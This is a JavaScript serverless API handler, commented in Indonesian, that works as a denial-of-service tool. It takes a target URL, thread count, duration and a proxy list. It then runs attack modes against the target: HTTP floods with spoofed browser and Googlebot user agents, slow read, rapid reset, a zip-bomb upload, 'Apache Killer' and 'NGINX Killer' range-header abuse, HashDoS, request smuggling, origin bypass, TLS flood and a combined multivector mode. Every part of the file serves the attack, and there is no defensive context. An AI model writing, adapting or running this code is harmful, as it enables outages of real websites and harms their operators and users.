import { HttpsProxyAgent } from 'https-proxy-agent'

export const config = {
  api: {
    bodyParser: true,
    responseLimit: false,
    // Vercel edge function? No, use serverless
  },
}

// Random helpers
function randomInt(min, max) {
  return Math.floor(Math.random() * (max - min + 1) + min)
}

function randomChoice(arr) {
  return arr[Math.floor(Math.random() * arr.length)]
}

const commonUserAgents = [
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",
  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.3 Safari/605.1.15"
]

const googlebotUserAgents = [
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
  "Mozilla/5.0 (Linux; Android 14; Pixel 8 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.6422.113 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
  "Mozilla/5.0 (iPhone; CPU iPhone OS 17_5_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
]

const acceptEncodings = ["gzip, deflate, br", "gzip, deflate", "br, gzip, deflate", "*"]
const acceptLanguages = ["en-US,en;q=0.9", "en-GB,en;q=0.8", "id-ID,id;q=0.9,en;q=0.8"]
const referers = ["https://www.google.com/", "https://www.bing.com/", "https://duckduckgo.com/", ""]
const cacheControl = ["no-cache", "max-age=0", "no-store"]

function buildRequest(host, path, method, extraHeaders = {}, body = null) {
  const useGooglebot = Math.random() < 0.3
  const headers = {
    'Host': host,
    'User-Agent': useGooglebot ? randomChoice(googlebotUserAgents) : randomChoice(commonUserAgents),
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
    'Accept-Language': randomChoice(acceptLanguages),
    'Accept-Encoding': randomChoice(acceptEncodings),
    'Connection': 'keep-alive',
    'Cache-Control': randomChoice(cacheControl),
    ...extraHeaders
  }
  
  const ref = randomChoice(referers)
  if (ref) headers['Referer'] = ref
  
  // Random path suffix
  const finalPath = path + (path.includes('?') ? '&' : '?') + 'rand=' + randomInt(1000000, 9999999)
  
  const fetchOptions = {
    method,
    headers,
  }
  
  if (body) {
    fetchOptions.body = body
    if (!headers['Content-Type']) headers['Content-Type'] = 'application/x-www-form-urlencoded'
  }
  
  return { url: `https://${host}${finalPath}`, options: fetchOptions }
}

// Menjalankan satu request dengan retry
async function makeRequest(target, proxyAgent, reqBuilder) {
  const proto = target.startsWith('https') ? 'https' : 'http'
  const urlObj = new URL(target)
  const host = urlObj.host
  const path = urlObj.pathname + urlObj.search || '/'
  
  const { url, options } = reqBuilder(host, path)
  
  // Gunakan proxy agent jika disediakan
  if (proxyAgent) {
    options.agent = proxyAgent
  }
  
  try {
    const controller = new AbortController()
    const timeout = setTimeout(() => controller.abort(), 15000)
    options.signal = controller.signal
    
    const response = await fetch(url, options)
    clearTimeout(timeout)
    
    // Baca minimal 1 byte (untuk slowread juga baca pelan-pelan)
    await response.text()
    return { success: true, status: response.status }
  } catch (err) {
    return { success: false, error: err.message }
  }
}

// Slow read: baca byte per byte dengan delay
async function slowReadRequest(target, proxyAgent) {
  const proto = target.startsWith('https') ? 'https' : 'http'
  const urlObj = new URL(target)
  const host = urlObj.host
  const path = urlObj.pathname || '/'
  const url = `${proto}://${host}${path}?rand=${randomInt(1000,9999)}`
  
  const options = {
    method: 'GET',
    headers: {
      'Host': host,
      'User-Agent': randomChoice(commonUserAgents),
      'Connection': 'keep-alive',
    },
  }
  if (proxyAgent) options.agent = proxyAgent
  
  try {
    const controller = new AbortController()
    setTimeout(() => controller.abort(), 30000)
    options.signal = controller.signal
    
    const response = await fetch(url, options)
    const reader = response.body.getReader()
    // Baca chunk kecil dengan jeda
    let bytesRead = 0
    while (true) {
      const { done, value } = await reader.read()
      if (done) break
      bytesRead += value.length
      // Simulasi pembacaan lambat
      await new Promise(resolve => setTimeout(resolve, 100))
      if (bytesRead > 1000) break // Stop setelah baca 1KB
    }
    reader.cancel()
    return { success: true }
  } catch (err) {
    return { success: false, error: err.message }
  }
}

// Rapid reset: tutup koneksi tiba-tiba
async function rapidResetRequest(target, proxyAgent) {
  // Di Node.js kita tidak bisa mengirim RST, tapi kita bisa abort di tengah jalan
  const proto = target.startsWith('https') ? 'https' : 'http'
  const urlObj = new URL(target)
  const host = urlObj.host
  const url = `${proto}://${host}/?rand=${randomInt(1000,9999)}`
  
  const controller = new AbortController()
  setTimeout(() => controller.abort(), 50) // abort setelah 50ms
  
  try {
    const options = {
      method: 'GET',
      headers: { 'Host': host, 'User-Agent': randomChoice(commonUserAgents) },
      signal: controller.signal,
    }
    if (proxyAgent) options.agent = proxyAgent
    await fetch(url, options)
    return { success: true }
  } catch {
    // Abort error tetap dianggap "request sent"
    return { success: true }
  }
}

// Zip bomb: kirim body gzip palsu
function generateZipBomb() {
  // Gzip file yang akan mengembang besar (10MB kecil)
  const deflate = require('zlib').deflateSync
  const gunzip = require('zlib').gunzipSync
  // Generate 10MB data berulang 'A' lalu kompres
  const data = Buffer.alloc(10 * 1024 * 1024, 'A')
  return deflate(data)
}

const zipBombPayload = (() => {
  try {
    return generateZipBomb().toString('base64')
  } catch {
    return null
  }
})()

async function sendZipBomb(target, proxyAgent) {
  if (!zipBombPayload) return { success: false, error: 'Failed to generate zip bomb' }
  const urlObj = new URL(target)
  const host = urlObj.host
  const url = `${target.startsWith('https') ? 'https' : 'http'}://${host}/upload?rand=${randomInt(1000,9999)}`
  
  const options = {
    method: 'POST',
    headers: {
      'Host': host,
      'User-Agent': randomChoice(commonUserAgents),
      'Content-Encoding': 'gzip',
      'Content-Type': 'application/octet-stream',
      'Content-Length': Buffer.from(zipBombPayload, 'base64').length.toString(),
    },
    body: Buffer.from(zipBombPayload, 'base64'),
  }
  if (proxyAgent) options.agent = proxyAgent
  
  try {
    const controller = new AbortController()
    setTimeout(() => controller.abort(), 30000)
    options.signal = controller.signal
    await fetch(url, options)
    return { success: true }
  } catch (err) {
    return { success: false, error: err.message }
  }
}

// Apache Killer: banyak Range header
function apacheKillerReq(host, path) {
  const ranges = []
  for (let i = 0; i < 20; i++) {
    const start = randomInt(0, 5000)
    const end = start + randomInt(100, 500)
    ranges.push(`${start}-${end}`)
  }
  const rangeHeader = `bytes=${ranges.join(',')}`
  const finalPath = path + (path.includes('?') ? '&' : '?') + 'rand=' + randomInt(1000,9999)
  return {
    url: `https://${host}${finalPath}`,
    options: {
      method: 'GET',
      headers: {
        'Host': host,
        'User-Agent': randomChoice(commonUserAgents),
        'Range': rangeHeader,
        'Connection': 'keep-alive',
      },
    },
  }
}

// NGINX Killer: overlapping range with long host
function nginxKillerReq(host, path) {
  const ranges = []
  for (let i = 0; i < 40; i++) {
    const start = randomInt(0, 5000)
    const end = start + randomInt(100, 1000)
    ranges.push(`${start}-${end}`)
  }
  const rangeHeader = `bytes=${ranges.join(',')}`
  const longHost = host + 'a'.repeat(randomInt(500, 2000)) // fake host panjang
  const finalPath = path + (path.includes('?') ? '&' : '?') + 'rand=' + randomInt(1000,9999)
  return {
    url: `https://${host}${finalPath}`, // tetap pakai host asli di URL
    options: {
      method: 'GET',
      headers: {
        'Host': longHost,
        'User-Agent': randomChoice(commonUserAgents),
        'Range': rangeHeader,
        'Connection': 'keep-alive',
      },
    },
  }
}

// Pipeline: kirim beberapa request dalam satu koneksi (simulasi)
async function pipelineRequest(target, proxyAgent) {
  const urlObj = new URL(target)
  const host = urlObj.host
  // Dengan fetch tidak bisa multiplexing manual, jadi kita kirim burst 3 request cepat
  for (let i = 0; i < 3; i++) {
    const { url, options } = buildRequest(host, urlObj.pathname, 'GET')
    if (proxyAgent) options.agent = proxyAgent
    try {
      const controller = new AbortController()
      setTimeout(() => controller.abort(), 5000)
      options.signal = controller.signal
      await fetch(url, options)
    } catch {}
  }
  return { success: true }
}

// HashDoS: POST dengan banyak parameter array
async function hashDosRequest(target, proxyAgent) {
  const urlObj = new URL(target)
  const host = urlObj.host
  const params = []
  for (let i = 0; i < 1000; i++) {
    params.push(`a[]=${i}`)
  }
  const body = params.join('&')
  const url = `${target.startsWith('https') ? 'https' : 'http'}://${host}/login?rand=${randomInt(1000,9999)}`
  const options = {
    method: 'POST',
    headers: {
      'Host': host,
      'User-Agent': randomChoice(commonUserAgents),
      'Content-Type': 'application/x-www-form-urlencoded',
      'Content-Length': body.length.toString(),
    },
    body,
  }
  if (proxyAgent) options.agent = proxyAgent
  try {
    const controller = new AbortController()
    setTimeout(() => controller.abort(), 15000)
    options.signal = controller.signal
    await fetch(url, options)
    return { success: true }
  } catch (err) {
    return { success: false, error: err.message }
  }
}

// Cache poison: request dengan Cache-Control: no-cache
function cachePoisonReq(host, path) {
  const finalPath = path + (path.includes('?') ? '&' : '?') + 'rand=' + randomInt(1000,9999)
  return {
    url: `https://${host}${finalPath}`,
    options: {
      method: 'GET',
      headers: {
        'Host': host,
        'User-Agent': randomChoice(commonUserAgents),
        'Cache-Control': 'no-cache, no-store, must-revalidate',
        'Pragma': 'no-cache',
        'X-Forwarded-For': `${randomInt(1,255)}.${randomInt(0,255)}.${randomInt(0,255)}.${randomInt(1,255)}`,
      },
    },
  }
}

// Origin bypass: kirim dengan host asli tapi IP target
function originBypassReq(targetIP, host, path) {
  const finalPath = path + (path.includes('?') ? '&' : '?') + 'rand=' + randomInt(1000,9999)
  return {
    url: `https://${targetIP}${finalPath}`, // langsung ke IP
    options: {
      method: 'GET',
      headers: {
        'Host': host,
        'User-Agent': randomChoice(commonUserAgents),
      },
    },
  }
}

export default async function handler(req, res) {
  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method Not Allowed' })
  }

  const { target, method: attackMethod, httpMethod, threads, duration, proxies } = req.body

  if (!target) {
    return res.status(400).json({ error: 'Target required' })
  }

  // Parse target
  let targetUrl
  try {
    targetUrl = new URL(target)
  } catch {
    return res.status(400).json({ error: 'Invalid URL' })
  }

  const useProxy = proxies && proxies.length > 0
  let proxyIndex = 0
  
  // Set headers untuk SSE-like streaming
  res.setHeader('Content-Type', 'text/plain; charset=utf-8')
  res.setHeader('Transfer-Encoding', 'chunked')
  res.setHeader('X-Content-Type-Options', 'nosniff')

  const startTime = Date.now()
  const endTime = startTime + (duration * 1000)
  let total = 0
  let success = 0
  let failed = 0

  const sendStats = () => {
    const elapsed = (Date.now() - startTime) / 1000
    const rps = elapsed > 0 ? Math.round(total / elapsed) : 0
    res.write(`data:${JSON.stringify({ total, success, failed, rps, elapsed: Math.round(elapsed) })}\n\n`)
  }

  // Worker function
  async function worker() {
    while (Date.now() < endTime) {
      // Pilih proxy jika digunakan
      let proxyAgent = null
      if (useProxy) {
        const proxy = proxies[proxyIndex % proxies.length]
        proxyIndex++
        try {
          proxyAgent = new HttpsProxyAgent(proxy)
        } catch {
          // Proxy invalid, lanjut tanpa proxy
        }
      }

      let result

      switch (attackMethod) {
        case 'flood':
          result = await makeRequest(target, proxyAgent, buildRequest)
          break
        case 'hashdos':
          result = await hashDosRequest(target, proxyAgent)
          break
        case 'slowread':
          result = await slowReadRequest(target, proxyAgent)
          break
        case 'smuggle': {
          const urlObj = new URL(target)
          const host = urlObj.host
          const path = urlObj.pathname || '/'
          const finalPath = path + '?rand=' + randomInt(1000,9999)
          // Smuggle dengan Transfer-Encoding chunked
          const smuggledBody = '0\r\n\r\nSMUGGLED'
          const smuggleReq = {
            url: `https://${host}${finalPath}`,
            options: {
              method: 'POST',
              headers: {
                'Host': host,
                'User-Agent': randomChoice(commonUserAgents),
                'Transfer-Encoding': 'chunked',
                'Content-Length': smuggledBody.length.toString(),
              },
              body: smuggledBody,
            },
          }
          if (proxyAgent) smuggleReq.options.agent = proxyAgent
          try {
            await fetch(smuggleReq.url, smuggleReq.options)
            result = { success: true }
          } catch (err) {
            result = { success: false, error: err.message }
          }
          break
        }
        case 'paretoflood': {
          const burst = randomInt(1, 10)
          for (let i = 0; i < burst && Date.now() < endTime; i++) {
            const r = await makeRequest(target, proxyAgent, buildRequest)
            if (r.success) success++
            else failed++
            total++
          }
          // Jeda antara burst
          await new Promise(resolve => setTimeout(resolve, randomInt(50, 200)))
          continue // skip increment di bawah
        }
        case 'zipbomb':
          result = await sendZipBomb(target, proxyAgent)
          break
        case 'rapidreset':
          result = await rapidResetRequest(target, proxyAgent)
          break
        case 'pipeline':
          result = await pipelineRequest(target, proxyAgent)
          break
        case 'originbypass': {
          const urlObj = new URL(target)
          const host = urlObj.host
          const path = urlObj.pathname || '/'
          // Asumsi user tahu origin IP, kita pakai target apa adanya sebagai IP
          const originIP = target.replace(/https?:\/\//, '').split('/')[0].split(':')[0]
          const { url, options } = originBypassReq(originIP, host, path)
          if (proxyAgent) options.agent = proxyAgent
          try {
            await fetch(url, options)
            result = { success: true }
          } catch (err) {
            result = { success: false, error: err.message }
          }
          break
        }
        case 'tlsflood': {
          // Cukup membuat koneksi HTTPS lalu tutup
          const urlObj = new URL(target)
          const host = urlObj.host
          const options = {
            method: 'GET',
            headers: { 'Host': host },
          }
          if (proxyAgent) options.agent = proxyAgent
          try {
            const controller = new AbortController()
            setTimeout(() => controller.abort(), 2000)
            options.signal = controller.signal
            await fetch(`https://${host}/?rand=${randomInt(1000,9999)}`, options)
            result = { success: true }
          } catch {
            result = { success: true } // handshake sukses walaupun timeout
          }
          break
        }
        case 'cachepoison': {
          const urlObj = new URL(target)
          const { url, options } = cachePoisonReq(urlObj.host, urlObj.pathname)
          if (proxyAgent) options.agent = proxyAgent
          try {
            await fetch(url, options)
            result = { success: true }
          } catch (err) {
            result = { success: false, error: err.message }
          }
          break
        }
        case 'apachekiller': {
          const urlObj = new URL(target)
          const { url, options } = apacheKillerReq(urlObj.host, urlObj.pathname)
          if (proxyAgent) options.agent = proxyAgent
          try {
            await fetch(url, options)
            result = { success: true }
          } catch (err) {
            result = { success: false, error: err.message }
          }
          break
        }
        case 'nginxkiller': {
          const urlObj = new URL(target)
          const { url, options } = nginxKillerReq(urlObj.host, urlObj.pathname)
          if (proxyAgent) options.agent = proxyAgent
          try {
            await fetch(url, options)
            result = { success: true }
          } catch (err) {
            result = { success: false, error: err.message }
          }
          break
        }
        case 'randombrowser':
          result = await makeRequest(target, proxyAgent, buildRequest)
          break
        case 'multivector': {
          const methods = ['flood', 'hashdos', 'rapidreset', 'nginxkiller', 'tlsflood']
          const chosen = methods[Math.floor(Math.random() * methods.length)]
          // Rekursif sederhana: panggil worker lagi dengan method berbeda
          switch (chosen) {
            case 'flood': result = await makeRequest(target, proxyAgent, buildRequest); break
            case 'hashdos': result = await hashDosRequest(target, proxyAgent); break
            case 'rapidreset': result = await rapidResetRequest(target, proxyAgent); break
            case 'nginxkiller': {
              const urlObj = new URL(target)
              const { url, options } = nginxKillerReq(urlObj.host, urlObj.pathname)
              try { await fetch(url, options); result = { success: true } } catch (err) { result = { success: false } }
              break
            }
            case 'tlsflood': {
              const urlObj = new URL(target)
              const host = urlObj.host
              try { await fetch(`https://${host}/?rand=${randomInt(1000,9999)}`, {signal: (()=>{const c=new AbortController();setTimeout(()=>c.abort(),2000);return c.signal})()}); result = { success: true } } catch { result = { success: true } }
              break
            }
          }
          break
        }
        default:
          result = await makeRequest(target, proxyAgent, buildRequest)
      }

      if (result && result.success) success++
      else failed++
      total++

      // Kirim stats periodik
      if (total % 10 === 0) {
        sendStats()
      }

      // Delay kecil antar request (jangan terlalu cepat memenuhi event loop)
      await new Promise(resolve => setTimeout(resolve, 10))
    }
  }

  // Jalankan workers
  const workerPromises = []
  for (let i = 0; i < threads; i++) {
    workerPromises.push(worker())
  }

  // Send stats setiap detik
  const statsInterval = setInterval(() => {
    sendStats()
  }, 1000)

  await Promise.all(workerPromises)
  clearInterval(statsInterval)

  // Final stats
  sendStats()
  
  // Kirim data final sebagai JSON biasa juga
  res.write(`data:${JSON.stringify({ total, success, failed, duration: Math.round((Date.now() - startTime) / 1000), final: true })}\n\n`)
  res.end()
}
